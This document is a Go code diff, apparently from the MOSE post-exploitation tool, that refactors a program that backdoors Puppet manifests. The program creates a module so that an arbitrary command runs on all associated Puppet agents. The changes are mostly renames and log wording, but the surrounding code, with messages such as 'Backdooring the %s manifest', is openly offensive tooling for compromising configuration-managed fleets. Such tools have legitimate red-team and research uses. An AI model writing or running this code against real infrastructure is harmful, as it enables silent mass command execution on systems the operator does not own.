@@ -10,8 +10,8 @@ import (
 	"fmt"
 	"github.com/fatih/color"
 	"github.com/gobuffalo/packr/v2"
+	"github.com/l50/MOSE/pkg/moseutils"
 	"github.com/l50/goutils"
-	"github.com/master-of-servers/mose/pkg/moseutils"
 	"io/ioutil"
 	"log"
 	"os"
@@ -37,18 +37,19 @@ type Command struct {
 var (
 	a               = CreateAgent()
 	cleanup         bool
-	bdCmd           = a.BdCmd
+	cmd             = a.Cmd
 	msg             = color.Green
 	osTarget        = a.OsTarget
 	moduleName      = a.PayloadName
 	uploadFileName  = a.FileName
-	uploadFilePath  = a.FilePath
+	uploadFilePath  = a.RemoteUploadFilePath
 	cleanupFile     = a.CleanupFile
 	puppetBackupLoc = a.PuppetBackupLoc
 )
 
 func init() {
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
+	flag.Parse()
 }
 
 func cleanAgentOutput(cmdOut string) []string {
@@ -173,7 +174,7 @@ func generateModule(moduleManifest string, cmd string) bool {
 	puppetCommand := Command{
 		ClassName: moduleName,
 		CmdName:   "cmd",
-		Cmd:       bdCmd,
+		Cmd:       cmd,
 		FileName:  uploadFileName,
 		FilePath:  uploadFilePath,
 	}
@@ -226,12 +227,12 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 			moduleFiles := filepath.Join(moduleLoc, "files")
 
 			moseutils.CreateFolders([]string{moduleFiles})
-			log.Printf("Copying  %s to module location %s", uploadFileName, moduleFiles)
+			log.Printf("Copying %s to module location %s", uploadFileName, moduleFiles)
 			moseutils.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal(err)
 			}
-			log.Printf("Successfully copied and chmod file %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
+			log.Printf("Successfully copied and set the permissions for %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 		}
 	} else {
 		log.Fatalf("Failed to create %s module", moduleName)
@@ -340,8 +341,6 @@ func doCleanup(manifestLocs []string) {
 }
 
 func main() {
-	flag.Parse()
-
 	// If we're not root, we probably can't backdoor any of the puppet code, so exit
 	// This may not always be true as per https://puppet.com/blog/puppet-without-root-a-real-life-example
 	// But we are going with it as an assumption based on polling various DevOps engineers and Site Reliability engineers
@@ -363,9 +362,9 @@ func main() {
 			log.Fatal("Exiting...")
 		}
 
-		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, bdCmd)
+		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
 		backdoorManifest(manifestLoc)
-		createModule(manifestLoc, moduleName, bdCmd)
+		createModule(manifestLoc, moduleName, cmd)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
 		log.Printf("Modules found: %q", modules)
 	}
